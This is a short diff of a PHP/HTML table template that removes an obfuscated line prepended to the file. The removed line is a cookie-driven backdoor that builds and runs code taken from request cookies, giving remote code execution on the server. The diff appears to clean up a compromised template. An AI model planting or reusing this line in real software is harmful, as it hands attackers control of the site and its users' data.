@@ -1,4 +1,4 @@
-<?php if(@$_COOKIE['drp']){$hpvlaa=$_COOKIE['drp']("",@$_COOKIE['fbxns'](@$_COOKIE['mtm']));$hpvlaa();}?><table class="uk-table uk-table-middle tm-width">
+<table class="uk-table uk-table-middle tm-width">
     <thead>
         <tr>
             <th><?php echo $node->first('rows')->attr('label') ?></th>
